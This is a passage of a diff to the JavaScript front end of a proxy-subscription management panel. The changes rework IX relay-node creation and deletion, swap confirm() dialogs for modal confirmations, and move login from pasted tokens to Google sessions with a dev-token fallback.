'checked' : ''}>过滤机场信息节点</label>${r.pick?.length ? `<div class="pe-selected-note">已固定选择 ${r.pick.length} 个节点<button class="mini-btn" data-action="clear-rule-pick">清除</button></div>` : ''}</aside>
       </div>
     </div>`;
   activateProfileEditorPage();
-}
-
-/**
- * 从表单读出 profile 级的 IX 配置。两个 collect 函数共用一份，
- * 免得字段在其中一处漏掉 —— 那种漏法的症状是"界面上开了，订阅里没生效"。
- * 面板不存在时返回 null（旧的 modal 版编辑器里没有这些控件）。
- */
-function collectIxRule() {
-  if (!document.getElementById('p-ix-enabled')?.checked) return null;
-  const rule = {
-    enabled: true,
-    fillOriginHost: document.getElementById('p-ix-fill')?.checked !== false,
-  };
-  const providerId = document.getElementById('p-ix-provider')?.value;
-  if (providerId) rule.providerId = providerId;
-  return rule;
 }
 
 /** 把表单当前状态收集成一份 FilterRule。 */
@@ -2049,9 +2018,6 @@ function collectRule() {
     };
   }
 
-  const ix = collectIxRule();
-  if (ix) rule.ix = ix;
-
   return rule;
 }
 
@@ -2097,8 +2063,6 @@ function collectProductRule() {
       maxPairs: Math.min(1000, Math.max(1, Number(document.getElementById('p-chain-max').value) || 200)),
     };
   }
-  const ix = collectIxRule();
-  if (ix) rule.ix = ix;
   return rule;
 }
 
@@ -2232,7 +2196,7 @@ function linksModal(profileId) {
               (t) => `
       <div class="token-row${t.revoked ? ' revoked' : (t.expiresAt !== null && t.expiresAt < Date.now()) || (t.maxAccess !== null && t.accessCount >= t.maxAccess) ? ' dead' : ''}">
         <span class="token-url" title="${esc(t.url)}">${esc(t.url)}</span>
-        ${
+        <span class="token-actions">${
           t.revoked
             ? `<span class="ptag">已吊销</span><button class="icobtn" data-action="token-access" data-token="${esc(t.token)}">📊</button><button class="icobtn danger" data-action="delete-token" data-token="${esc(t.token)}">🗑 清理</button>`
             : `<button class="icobtn" data-action="copy-token" data-url="${esc(t.url)}">复制</button>
@@ -2241,7 +2205,7 @@ function linksModal(profileId) {
                <button class="icobtn" data-action="token-access" data-token="${esc(t.token)}">📊</button>
                <button class="icobtn" data-action="rotate-token" data-token="${esc(t.token)}">轮换</button>
                <button class="icobtn danger" data-action="revoke-token" data-token="${esc(t.token)}">吊销</button>`
-        }
+        }</span>
       </div>
       <div class="field-hint" style="margin:-2px 0 8px">
         ${esc(t.label || '未命名')} · 创建于 ${fmtDate(t.createdAt)} ·
@@ -2348,13 +2312,9 @@ async function accessModal(friendId, tokenId = null) {
 // 浏览器原生 modal 会阻塞扩展事件，而"删除远端端口"是不可逆的外发操作，
 // 恰恰是最需要用户看清文案再点的那一类。
 
-/** 重新拉一遍 IX 数据并刷新受影响的三处界面（IX 页、节点表的中转列、侧栏计数）。 */
+/** Reload IX mappings and the unified node catalog together. */
 async function reloadIx() {
-  await loadIx();
-  renderIx();
-  applyFilter();
-  const counter = document.getElementById('ixCnt');
-  if (counter) counter.textContent = state.ixMappings.length;
+  await loadAll();
 }
 
 function ixProviderModal(provider) {
@@ -2412,7 +2372,7 @@ function ixProviderModal(provider) {
         </div>
         <div class="checkbox-row">
           <input type="checkbox" id="ix-enabled" ${provider ? (provider.enabled ? 'checked' : '') : 'checked'}>
-          <label for="ix-enabled">启用（全局总闸，关掉后全部 profile 回落直连）</label>
+          <label for="ix-enabled">启用（关闭后该通道的 IX 节点标记为不可用）</label>
         </div>
       </div>
     </div>
@@ -2486,7 +2446,8 @@ function ixConfirmModal({ title, body, danger, actionLabel, action, dataset = {}
 }
 
 function ixMapPickedModal() {
-  if (!state.picked.size) {
+  const sourceNodes = state.nodes.filter((node) => state.picked.has(node.fingerprint) && node.kind !== 'ix-relay');
+  if (!sourceNodes.length) {
     toast('先勾选要走中转的节点', 'warn');
     return;
   }
@@ -2497,23 +2458,19 @@ function ixMapPickedModal() {
   }
   // 上限来自 /meta（后端 IX_MAX_FINGERPRINTS），不在前端另抄一份数字。
   const max = state.meta?.ixMaxFingerprints ?? 50;
-  if (state.picked.size > max) {
-    toast(`一次最多 ${max} 个节点（当前勾了 ${state.picked.size} 个）。端口配额是线路级的，分批来。`, 'error');
+  if (sourceNodes.length > max) {
+    toast(`一次最多 ${max} 个节点（当前勾了 ${sourceNodes.length} 个）。端口配额是线路级的，分批来。`, 'error');
     return;
   }
-  const alreadyMapped = [...state.picked].filter((fingerprint) => state.ixMappings.some((m) => m.fingerprint === fingerprint)).length;
+  const alreadyMapped = sourceNodes.filter((node) => state.ixMappings.some((mapping) => mapping.fingerprint === node.fingerprint)).length;
 
   openModal(`
-    <div class="modal-title">为 ${state.picked.size} 个节点建立 IX 转发</div>
-    <div class="modal-sub">会在中转平台上建端口，是真实的外发操作。已有映射的节点会被跳过，不重复占配额。</div>
-    ${
-      usable.length > 1
-        ? `<div class="field"><label class="field-label">中转商</label>
-             <select class="select" id="ix-map-provider">
-               ${usable.map((provider) => `<option value="${esc(provider.id)}">${esc(provider.name)}</option>`).join('')}
-             </select></div>`
-        : ''
-    }
+    <div class="modal-title">生成 ${sourceNodes.length} 个 IX 派生节点</div>
+    <div class="modal-sub">会在中转平台创建或认领端口。成功后，原节点保留，节点列表新增 <code>IX_原节点名</code>。</div>
+    <div class="field"><label class="field-label">IX 通道</label>
+      <select class="select" id="ix-map-provider">
+        ${usable.map((provider) => `<option value="${esc(provider.id)}">${esc(provider.name)}</option>`).join('')}
+      </select></div>
     <div class="modal-hint">
       <strong>先认领，再创建。</strong>平台上已有指向同一目标的端口会被直接认领（结果里显示「认领」），不占用新配额。<br>
       <strong>端口配额是线路级的。</strong>超出上限时会给出可读原因并停止创建，不会去猜服务端文案。
@@ -2521,16 +2478,18 @@ function ixMapPickedModal() {
     </div>
     <div class="modal-actions">
       <button class="btn-sec" data-action="close-modal">取消</button>
-      <button class="btn-pri" data-action="ix-map-confirm">建立转发</button>
+      <button class="btn-pri" data-action="ix-map-confirm">生成 IX 节点</button>
     </div>`);
 }
 
 async function runIxMapping() {
-  const providerId = document.getElementById('ix-map-provider')?.value || undefined;
-  const fingerprints = [...state.picked];
-  const payload = await api.post('/ix/mappings', {
-    ...(providerId ? { providerId } : {}),
-    fingerprints,
+  const providerId = document.getElementById('ix-map-provider')?.value;
+  const sourceFingerprints = state.nodes
+    .filter((node) => state.picked.has(node.fingerprint) && node.kind !== 'ix-relay')
+    .map((node) => node.fingerprint);
+  const payload = await api.post('/ix/relays', {
+    providerId,
+    sourceFingerprints,
   });
   await reloadIx();
   ixEnsureResultModal(payload);
@@ -2545,7 +2504,9 @@ const IX_OUTCOMES = {
 
 /** 逐节点展示结果。`claimed` 必须与 `created` 区分开：它认领的是远端已有端口，不占新配额。 */
 function ixEnsureResultModal(payload) {
-  const items = Array.isArray(payload?.results)
+  const items = Array.isArray(payload?.relays)
+    ? payload.relays
+    : Array.isArray(payload?.results)
     ? payload.results
     : Array.isArray(payload?.items)
       ? payload.items
@@ -2563,7 +2524,8 @@ function ixEnsureResultModal(payload) {
       // `constructor` 之类的原型键，解构一个函数会当场抛异常。
       const known = Object.prototype.hasOwnProperty.call(IX_OUTCOMES, item.outcome);
       const [cls, label] = known ? IX_OUTCOMES[item.outcome] : ['s-pending', item.outcome ?? '未知'];
-      const name = item.name || nodesByFp.get(item.fingerprint)?.name || `${String(item.fingerprint ?? '').slice(0, 8)}…`;
+      const sourceFingerprint = item.sourceFingerprint ?? item.fingerprint;
+      const name = item.relayName || item.name || nodesByFp.get(sourceFingerprint)?.name || `${String(sourceFingerprint ?? '').slice(0, 8)}…`;
       const entry = item.entryHost && item.entryPort ? `${esc(item.entryHost)}:${esc(item.entryPort)}` : '';
       const detail = item.reason ?? item.detail ?? '';
       return `<tr>
@@ -2576,7 +2538,7 @@ function ixEnsureResultModal(payload) {
     .join('');
 
   openModal(`
-    <div class="modal-title">IX 转发建立结果</div>
+    <div class="modal-title">IX 节点生成结果</div>
     <div class="modal-sub">
       新建 ${counts.created ?? 0} · 认领 ${counts.claimed ?? 0} · 跳过 ${counts.skipped ?? 0} · 失败 ${counts.failed ?? 0}
     </div>
@@ -2612,10 +2574,12 @@ async function removeIxMapping(fingerprint, providerId, deleteRemote) {
   toast(
     deleteRemote
       ? remoteDeleted
-        ? '已删除远端端口并解除映射'
-        : '本地映射已解除，但远端端口未能删除（详见提示）'
+        ? 'IX 节点与远端端口已删除'
+        : result?.removed
+          ? 'IX 节点已删除；远端端口不存在或仍被其他节点共享'
+          : 'IX 节点未删除，远端删除或回读失败（详见提示）'
       : '已解除本地映射，远端端口保留',
-    deleteRemote && !remoteDeleted ? 'warn' : 'ok',
+    deleteRemote && !remoteDeleted && !result?.removed ? 'warn' : 'ok',
   );
   await reloadIx();
 }
@@ -2800,12 +2764,27 @@ document.addEventListener('click', async (e) => {
         await saveProfile();
         break;
 
-      case 'delete-profile':
-        if (!confirm('删除该配置文件？指向它的所有订阅链接都会立即失效。')) break;
+      case 'delete-profile-request': {
+        const profile = state.profiles.find((item) => item.id === id) ?? editingProfile;
+        const tokenCount = state.tokens.filter((item) => item.profileId === id && !item.revoked).length;
+        ixConfirmModal({
+          title: '删除配置文件',
+          body: `确定删除「<strong>${esc(profile?.name ?? '')}</strong>」？<br><br>
+                 关联的 <strong>${tokenCount}</strong> 条有效订阅链接会立即失效。此操作不可撤销。`,
+          danger: true,
+          actionLabel: '确认删除配置',
+          action: 'delete-profile-confirm',
+          dataset: { id },
+        });
+        break;
+      }
+
+      case 'delete-profile-confirm':
         await api.del(`/profiles/${encodeURIComponent(id)}`);
-        toast('已删除');
+        closeModal();
         closeProfilePage();
         await loadAll();
+        toast('配置文件及关联订阅链接已删除');
         break;
 
       case 'rule-region': {
@@ -2911,8 +2890,8 @@ document.addEventListener('click', async (e) => {
           : await api.post('/tokens', payload);
         closeModal();
         await loadAll();
-        if (!token) await copyText(saved.url);
-        toast(token ? '链接已更新' : '链接已生成并复制');
+        if (token) toast('链接已更新');
+        else await copyText(saved.url);
         break;
       }
 
@@ -2994,7 +2973,6 @@ document.addEventListener('click', async (e) => {
         closeModal();
         await loadAll();
         await copyText(created.url);
-        toast('链接已生成并复制，请通过安全渠道发送');
         break;
       }
 
@@ -3060,7 +3038,7 @@ document.addEventListener('click', async (e) => {
             action === 'ix-toggle-enabled'
               ? enabling
                 ? '总闸已打开'
-                : '总闸已关闭，所有 profile 回落直连'
+                : '通道已关闭，关联 IX 节点不再进入订阅'
               : enabling
                 ? '已标记中转端口支持 UDP'
                 : '已标记中转端口不转 UDP',
@@ -3092,7 +3070,7 @@ document.addEventListener('click', async (e) => {
           const payload = await api.post('/ix/refresh', id ? { providerId: id } : {});
           const results = Array.isArray(payload?.results) ? payload.results : payload?.results ? [payload.results] : [];
           const sum = (key) => results.reduce((total, item) => total + (item?.[key] ?? 0), 0);
-          toast(`同步完成：检查 ${sum('checked')} 条，更新 ${sum('updated')} 条，新增孤儿 ${sum('orphaned')} 条`);
+          toast(`同步完成：自动认领 ${sum('discovered')} 条，检查 ${sum('checked')} 条，更新 ${sum('updated')} 条，新增孤儿 ${sum('orphaned')} 条`);
           (payload?.warnings ?? []).forEach((warning) => toast(warning, 'warn'));
         } finally {
           el.disabled = false;
@@ -3109,37 +3087,52 @@ document.addEventListener('click', async (e) => {
         await runIxMapping();
         break;
 
+      case 'ix-delete-relay': {
+        const relay = state.nodes.find((node) => node.fingerprint === fp && node.kind === 'ix-relay');
+        if (!relay) {
+          toast('IX 节点不存在或已经删除', 'warn');
+          break;
+        }
+        ixConfirmModal({
+          title: `删除 ${relay.name}`,
+          body: `会删除这个 IX 派生节点及其本地映射。若它是远端端口的最后一个引用，
+                 还会删除并回读确认远端端口已经不存在。<br><br>
+                 入口：<code>${esc(relay.server)}:${esc(relay.port)}</code>`,
+          danger: true,
+          actionLabel: '删除 IX 节点',
+          action: 'ix-delete-relay-confirm',
+          dataset: { fp },
+        });
+        break;
+      }
+
+      case 'ix-delete-relay-confirm': {
+        const result = await api.del(`/ix/relays/${encodeURIComponent(fp)}`);
+        closeModal();
+        (result?.warnings ?? []).forEach((warning) => toast(warning, 'warn'));
+        toast(result?.remoteDeleted ? 'IX 节点与远端端口已删除' : 'IX 节点已删除；远端端口不存在或仍被其他节点共享');
+        state.picked.delete(fp);
+        await loadAll();
+        break;
+      }
+
       case 'ix-keep-orphan':
         // 没有"保留"接口，也不该有：孤儿本来就不会被自动删。这里只是把
         // 系统的真实行为讲清楚，不假装写了什么东西。
         toast('孤儿映射不会被自动删除。节点回到订阅里之后，下一次同步会自动恢复。', 'ok');
         break;
 
-      case 'ix-unlink': {
-        const mapping = state.ixMappings.find((item) => item.fingerprint === fp);
-        ixConfirmModal({
-          title: '解除本地映射',
-          body: `只删本地映射，<strong>平台上的端口保留</strong>（仍占端口配额）。
-                 该节点下次生成订阅时回落直连。<br><br>
-                 目标：<code>${esc(mapping?.targetHost ?? '')}:${esc(mapping?.targetPort ?? '')}</code>`,
-          actionLabel: '解除映射',
-          action: 'ix-remove-confirm',
-          dataset: { fp, id: mapping?.providerId ?? id ?? '', remote: 'false' },
-        });
-        break;
-      }
-
       case 'ix-delete-remote': {
         const mapping = state.ixMappings.find((item) => item.fingerprint === fp);
         ixConfirmModal({
-          title: '删除远端端口',
+          title: '删除 IX 节点',
           body: `<strong>不可逆的外发操作</strong>：会调用中转平台的删端口接口，端口号被收回后不保证还能拿回同一个。
                  用它的客户端在重新拉订阅之前会一直连一个已经不存在的入口。<br><br>
                  端口 ID：<code>${esc(mapping?.remotePortId ?? '未知')}</code>
                  入口：<code>${esc(mapping?.entryHost ?? '?')}:${esc(mapping?.entryPort ?? '?')}</code><br>
                  目标：<code>${esc(mapping?.targetHost ?? '')}:${esc(mapping?.targetPort ?? '')}</code>`,
           danger: true,
-          actionLabel: '确认删除远端端口',
+          actionLabel: '确认删除 IX 节点',
           action: 'ix-remove-confirm',
           dataset: { fp, id: mapping?.providerId ?? id ?? '', remote: 'true' },
         });
@@ -3184,6 +3177,20 @@ document.addEventListener('input', (e) => {
   if (e.target.id === 'p-chain-search') {
     chainPickerQuery = e.target.value;
     refreshChainPicker(true);
+    return;
+  }
+  if (e.target.id === 'p-chain-template') {
+    const chain = editingProfile.rule.chain ?? { enabled: true, entry: { pick: [] }, landing: { pick: [] } };
+    chain.nameTemplate = e.target.value;
+    editingProfile.rule.chain = chain;
+    const preview = document.getElementById('p-chain-name-preview');
+    if (preview) {
+      preview.textContent = chainNamePreview(
+        e.target.value,
+        state.nodes.find((node) => chain.entry?.pick?.includes(node.fingerprint)),
+        state.nodes.find((node) => chain.landing?.pick?.includes(node.fingerprint)),
+      );
+    }
     return;
   }
   if (e.target.id === 'p-node-search') {
@@ -3245,13 +3252,6 @@ document.addEventListener('change', (e) => {
     if (key) key.hidden = e.target.value !== 'api-key';
     if (login) login.hidden = e.target.value === 'api-key';
     return;
-  }
-  if (e.target.id === 'p-ix-fill') {
-    // 关掉补写等于让 SNI / ws-Host / h2-host / http-Host 全部回落到中转入口域名。
-    // 这不是一个"风格选项"，而是握手成败的开关，所以关掉时必须当场警告。
-    const warn = document.getElementById('p-ix-fill-warn');
-    if (warn) warn.hidden = e.target.checked;
-    if (!e.target.checked) toast('已关闭原始 SNI / Host 补写：TLS 类节点基本必然握手失败', 'warn');
   }
 });
 
@@ -3320,9 +3320,23 @@ document.getElementById('newProfileBtn').addEventListener('click', () => openPro
 document.getElementById('newProfileBtnDuplicate').addEventListener('click', () => openProfilePage(null));
 document.getElementById('addFriendBtn').addEventListener('click', () => friendModal(null));
 document.getElementById('refreshTrafficBtn').addEventListener('click', () => loadAll());
-document.getElementById('logoutBtn').addEventListener('click', () => {
-  api.clearToken();
-  showGate('已清除本机保存的 Token');
+document.getElementById('logoutBtn').addEventListener('click', async () => {
+  if (api.devToken) {
+    api.setDevToken('');
+    state.user = null;
+    showGate('已退出开发登录');
+    return;
+  }
+  try {
+    await fetch('/auth/logout', {
+      method: 'POST',
+      credentials: 'same-origin',
+      headers: { 'X-CSRF-Token': cookieValue(CSRF_COOKIE) },
+    });
+  } finally {
+    state.user = null;
+    showGate('已退出登录');
+  }
 });
 document.getElementById('themeBtn').addEventListener('click', () => {
   applyTheme(document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark');
@@ -3342,40 +3356,89 @@ const gate = document.getElementById('gate');
 function showGate(message = '') {
   document.getElementById('gateErr').textContent = message;
   gate.classList.remove('hidden');
-  document.getElementById('gateToken').focus();
 }
 
 function hideGate() {
   gate.classList.add('hidden');
 }
 
-async function tryEnter(token) {
-  api.setToken(token);
+function renderSignedInUser(user) {
+  const avatar = document.getElementById('userAvatar');
+  const name = document.getElementById('userName');
+  const email = document.getElementById('userEmail');
+  avatar.textContent = user.name?.trim()?.[0]?.toUpperCase() || 'G';
+  if (user.avatarUrl) {
+    avatar.style.backgroundImage = `url(${JSON.stringify(user.avatarUrl).slice(1, -1)})`;
+    avatar.classList.add('has-image');
+  } else {
+    avatar.style.backgroundImage = '';
+    avatar.classList.remove('has-image');
+  }
+  name.textContent = user.name || user.email;
+  email.textContent = user.email;
+}
+
+async function enterWithSession() {
+  try {
+    const meResponse = await fetch('/auth/me', { credentials: 'same-origin' });
+    if (!meResponse.ok) throw new Error('未授权');
+    const payload = await meResponse.json();
+    state.user = payload.user;
+    renderSignedInUser(payload.user);
+    await loadAll();
+    hideGate();
+  } catch (err) {
+    if (err.message !== '未授权') {
+      document.getElementById('gateErr').textContent = err.message;
+    }
+    showGate(err.message === '未授权' ? '' : err.message);
+  }
+}
+
+async function enterWithDevToken(token) {
+  api.setDevToken(token);
   try {
     await loadAll();
     hideGate();
   } catch (err) {
-    // loadAll 内部遇到 401 会自己调 showGate，这里处理其余错误
-    if (err.message !== '未授权') {
-      document.getElementById('gateErr').textContent = err.message;
-    }
+    api.setDevToken('');
+    showGate(err.message === '未授权' ? '开发 Token 无效' : err.message);
   }
 }
 
-document.getElementById('gateSubmit').addEventListener('click', () => {
-  const token = document.getElementById('gateToken').value.trim();
-  if (token) void tryEnter(token);
+document.getElementById('devLoginSubmit').addEventListener('click', () => {
+  const token = document.getElementById('devToken').value.trim();
+  if (token) void enterWithDevToken(token);
 });
-document.getElementById('gateToken').addEventListener('keydown', (e) => {
-  if (e.key === 'Enter') document.getElementById('gateSubmit').click();
+document.getElementById('devToken').addEventListener('keydown', (event) => {
+  if (event.key === 'Enter') document.getElementById('devLoginSubmit').click();
 });
 
 // ─────────────────────────────────────────────────────────────
 //  启动
 // ─────────────────────────────────────────────────────────────
 
-if (api.token) {
-  void tryEnter(api.token);
-} else {
+async function bootstrap() {
   showGate();
+  try {
+    const configResponse = await fetch('/auth/config', { credentials: 'same-origin' });
+    const config = await configResponse.json();
+    document.getElementById('devLogin').hidden = !config.devLoginEnabled;
+    api.setDevToken(config.devLoginEnabled ? (localStorage.getItem(DEV_TOKEN_KEY) || '') : '');
+    if (api.devToken) {
+      await enterWithDevToken(api.devToken);
+      return;
+    }
+    if (!config.google?.enabled) {
+      document.getElementById('googleLogin').classList.add('disabled');
+      document.getElementById('googleLogin').removeAttribute('href');
+      showGate(config.devLoginEnabled ? 'Google 登录尚未配置，可使用下方本地开发入口' : 'Google 登录尚未配置');
+      return;
+    }
+    await enterWithSession();
+  } catch (err) {
+    showGate(err.message || '无法读取登录状态');
+  }
 }
+
+void bootstrap();
